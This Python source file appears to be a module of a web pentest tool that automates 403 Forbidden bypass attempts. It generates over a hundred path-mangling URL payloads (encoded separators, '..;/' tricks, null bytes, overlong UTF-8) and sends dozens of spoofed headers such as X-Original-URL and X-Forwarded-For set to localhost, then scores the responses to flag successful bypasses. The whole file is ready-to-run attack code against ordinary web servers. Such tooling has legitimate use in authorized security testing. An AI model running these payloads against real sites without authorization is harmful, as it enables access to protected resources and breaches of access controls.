import random, string
from urllib.parse import urlparse, urljoin
from Dependencies.displays import M, W, R, Y, G, C, handle_error
from Dependencies.get_request import get_request


PAYLOAD_TEMPLATES = [
    "/{p}",
    "/{p}/",
    "/{p}//",
    "//{p}//",
    "///{p}///",

    "/./{p}",
    "/./{p}/",
    "/./{p}/./",

    "/{p}?",
    "/{p}??",
    "/{p}/?",
    "/{p}/?/",
    "/{p}/??",
    "/{p}/??/",

    "/{p}/..",
    "/{p}/../",
    "/{p}/.",
    "/{p}/./",
    "/{p}/.//",

    "/{p}/*",
    "/{p}//*",
    "/*/{p}",
    "/*/{p}/",

    "/{p}%2f",
    "/{p}%2f/",
    "/{p}%20",
    "/{p}%20/",
    "/{p}%09",
    "/{p}%09/",
    "/{p}%0a",
    "/{p}%0a/",
    "/{p}%0d",
    "/{p}%0d/",
    "/{p}%25",
    "/{p}%25/",
    "/{p}%23",
    "/{p}%23/",
    "/{p}%26",
    "/{p}%26/",
    "/{p}%3f",
    "/{p}%3f/",

    "/{p}#",
    "/{p}#/",
    "/{p}#/./",

    "/..;/{p}",
    "/..;/{p}/",
    "/.;/{p}",
    "/.;/{p}/",
    "/;/{p}",
    "/;/{p}/",
    "//;//{p}",
    "//;//{p}/",

    "/%2e/{p}",
    "/%2e/{p}/",
    "/%252e/{p}",
    "/%20/{p}/%20",
    "/%20/{p}/%20/",

    "/{p}%252f",
    "/{p}%25252f",
    "/%252e%252e/{p}",
    "/%2e%2e/{p}",
    "/.%2e/{p}",
    "/%2e./{p}",
    "/..%252f{p}",

    "/{p}%c0%af",
    "/{p}%e0%80%af",
    "/{p}%ef%bc%8f",

    "\\{p}",
    "\\\\{p}",
    "/\\{p}",
    "/{p}\\",
    "/{p}\\/",
    "/{p}//\\",
    "/{p}/\\/",

    "/{p};foo=bar",
    "/{p};jsessionid=123",
    "/{p}/;foo=bar/",
    "/{p};/",
    "/{p};.css",

    "/{p}/..;/",
    "/{p}..;/",
    "/{p};/",
    "/{p}/..%3B/",
    "/{p}/..\\;/",
    "/{p}/;%2f..%2f..%2f",

    "/{p}.json",
    "/{p}/.json",
    "/{p}.css",
    "/{p}.html",

    "/{p}%00",

    "/{p}?id=1",

    "/{p}~",
    "/{p}/~",

    "/{p}/°/",
    "/{p}/&",
    "/{p}/-",

    "/{p}\\/\\//",

    "/{upper}",
    "/{upper}/",

    "/{plus}",
    "/{plus}/",

    "/{p}.txt",
    "/{p}.jpg",
    "/{p}.xml",
    "/{p}.php",
    "/{p}/index.html",
    "/{p}/index.php", 
    
]


HEADER_BYPASSES = [
    {"X-Original-URL": "{path}"},
    {"X-Rewrite-URL": "{path}"},

    {"X-Custom-IP-Authorization": "127.0.0.1"},
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Forwarded-For": "localhost"},
    {"X-Forwarded-For": "127.0.0.1, 127.0.0.1"},
    {"X-Forwarded-For": "127.0.0.1:80"},

    {"X-Remote-IP": "127.0.0.1"},
    {"X-Client-IP": "127.0.0.1"},
    {"Client-IP": "127.0.0.1"},
    {"True-Client-IP": "127.0.0.1"},
    {"CF-Connecting-IP": "127.0.0.1"},
    {"X-Originating-IP": "127.0.0.1"},
    {"X-Remote-Addr": "127.0.0.1"},
    {"X-ProxyUser-IP": "127.0.0.1"},

    {"Forwarded": "for=127.0.0.1"},
    {"Forwarded": "for=localhost"},

    {"X-Host": "127.0.0.1"},
    {"X-Forwarded-Host": "127.0.0.1"},
    {"Host": "127.0.0.1"},

    {"X-Forwarded-Proto": "https"},
    {"X-Forwarded-Proto": "http"},

    {"X-Forwarded-Scheme": "https"},
    {"X-Forwarded-Scheme": "http"},

    {"X-URL": "{path}"},
    {"X-Request-URI": "{path}"},
    {"Request-URI": "{path}"},
    {"X-Original-URI": "{path}"},

    {"Front-End-Https": "on"},
    {"X-Forwarded-Port": "443"},

    {"X-Forwarded-Prefix": "/"},
    {"X-Forwarded-Prefix": "{path}"},

    {
        "X-Original-URL": "{path}",
        "X-Forwarded-For": "127.0.0.1"
    },

    {
        "X-Rewrite-URL": "{path}",
        "X-Forwarded-For": "127.0.0.1"
    },
    
    {"X-Forwarded-Server": "127.0.0.1"},
    {"X-HTTP-Host-Override": "127.0.0.1"},
    {"X-Host": "localhost"},
    {"X-Forwarded-Host": "localhost"},
    {"Forwarded": "for=127.0.0.1;host=127.0.0.1"},

    {"Host": "localhost"},
    {"Host": "localhost:80"},
    {"Host": "127.0.0.1:80"},

    {"X-Forwarded-Host": "localhost:80"},
    {"X-Host": "localhost:80"},
    {"X-Forwarded-Server": "localhost"},

    {"X-Forwarded-For": "::1"},
    {"X-Forwarded-For": "0:0:0:0:0:0:0:1"},
    {"X-Forwarded-For": "127.1"},
    {"X-Forwarded-For": "2130706433"},
    {"X-Forwarded-For": "0177.0000.0000.0001"},

    {
        "X-Original-URL": "{path}",
        "X-Forwarded-Host": "127.0.0.1"
    },
]



def get_random_path(length=12):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length)) # Generate a random path string to test for 404 baseline


def build_baselines(args):
    baselines = {}
    try:
        r = get_request(args, args.url, timeout=10, redirect=False)
        if r is not None:
            baselines["target"] = {
                "status": r.status_code,
                "length": len(r.text),
                "words": len(r.text.split())
            }

        parsed = urlparse(args.url)

        # Home page
        home_url = f"{parsed.scheme}://{parsed.netloc}/"
        r = get_request(args, home_url, timeout=10, redirect=False)
        if r is not None:
            baselines["home"] = {
                "status": r.status_code,
                "length": len(r.text)
            }

        random_url = urljoin(
            home_url,
            get_random_path(20)
        )

        r = get_request(args, random_url, timeout=10, redirect=False)
        if r is not None:
            baselines["notfound"] = {
                "status": r.status_code,
                "length": len(r.text)
            }
    except Exception as e:
        handle_error(e, "ERROR", args.verbose)
    return baselines


def classify_response(response, baselines):
    target = baselines.get("target")
    home = baselines.get("home")
    notfound = baselines.get("notfound")
    if not target:
        return None

    if looks_like(target, response):
        return None

    if looks_like(home, response):
        return None

    if looks_like(notfound, response):
        return None

    status = response.status_code
    if status == 404:
        return None

    if status in (200, 201, 202, 204, 206):
        return "HIGH"

    if status in (301, 302, 307, 308):
        location = response.headers.get("Location", "")
        if location in ("/", "", "index.php"):
            return None
        return "MEDIUM"

    if status == 401:
        return "MEDIUM"

    if status == target["status"]:
        return "LOW"
    return None


def looks_like(reference, response):
    if response.status_code != reference["status"]:
        return False

    ref_len = reference["length"]
    cur_len = len(response.text)

    delta = abs(cur_len - ref_len)

    # Tolerence score
    if delta > ref_len * 0.02:
        return False
    return True


def generate_payloads(url):
    parsed = urlparse(url)

    full_path = parsed.path.rstrip("/")

    if not full_path:
        return []

    variables = {
        "p": full_path.lstrip("/"),
        "full": full_path,
        "last": full_path.split("/")[-1],
        "upper": full_path.upper().lstrip("/"),
    }

    payloads = set()
    for template in PAYLOAD_TEMPLATES:
        try:
            payloads.add(template.format(**variables))
        except KeyError:
            continue
    return sorted(payloads)


def build_url(base_url, payload):
    parsed = urlparse(base_url)
    return (
        f"{parsed.scheme}://"
        f"{parsed.netloc}"
        f"{payload}"
    )

def do_403(args):
    findings = []
    baselines = build_baselines(args)
    print(f"\n{C}[+] 403 bypass")
    print(f"{G}[*] TARGET  :{W}", baselines.get("target"))
    print(f"{G}[*] HOME    :{W}", baselines.get("home"))
    print(f"{G}[*] 404     :{W}", baselines.get("notfound"))

    target = baselines.get("target")
    if not target:
        print(f"{R}[!] Unable to build baseline")
        return

    print(f"{Y}[!] {W}Target baseline -> {target['status']} {target['length']} bytes")
    payloads = generate_payloads(args.url)
    print(f"{Y}[!] {W}Generated {Y}{len(payloads)} url payloads {W}and {Y}{len(HEADER_BYPASSES)} headers payloads")
    for payload in payloads:
        try:
            target_url = build_url(args.url, payload)
            response = get_request(args, target_url, timeout=10, redirect=False)
            if response is None:
                continue
            
            if looks_like(baselines.get("home"), response):
                color = W
                tag = "HOME"
            elif looks_like(baselines.get("notfound"), response):
                color = W
                tag = "404"
            elif looks_like(baselines.get("target"), response):
                color = W
                tag = "403"
            else:
                color = R if response.status_code == 200 else Y
                tag = response.status_code
            
            print(f"{color}[{tag}] {W}{len(response.text):<8} {target_url}")
            severity = classify_response(response, baselines)
            if severity:
                findings.append(
                    (
                        severity,
                        response.status_code,
                        len(response.text),
                        target_url
                    )
                )
        except Exception as e:
            handle_error(e, "ERROR", args.verbose)

    parsed = urlparse(args.url)
    protected_path = parsed.path or "/"
    for header_set in HEADER_BYPASSES:
        try:
            headers = {}
            for k, v in header_set.items():
                headers[k] = v.format(path=protected_path)

            response = get_request(args, args.url, headers=headers, timeout=10, redirect=False)
            if response is None:
                continue

            location = response.headers.get("Location")
            if looks_like(baselines.get("home"), response):
                color = W
                tag = "HOME"

            elif looks_like(baselines.get("notfound"), response):
                color = W
                tag = "404"

            elif looks_like(baselines.get("target"), response):
                color = W
                tag = "403"

            else:
                color = R if response.status_code == 200 else Y
                tag = response.status_code

            if location:
                print(f"{color}[{tag}] {W}{len(response.text):<8} {headers} -> {location}")
            else:
                print(f"{color}[{tag}] {W}{len(response.text):<8} {headers}")

            severity = classify_response(response, baselines)
            if severity:
                findings.append(
                    (
                        severity,
                        response.status_code,
                        len(response.text),
                        header_set
                    )
                )
        except Exception as e:
            handle_error(e, "ERROR", args.verbose)

    print(f"\n{G}[+] Interesting findings: {Y}{len(findings)}")

    for severity, status, length, payload in findings:
        color = R if severity == "HIGH" else Y
        print(f"{color}[{severity}] {W}[{status}] {length:<8} {payload}")

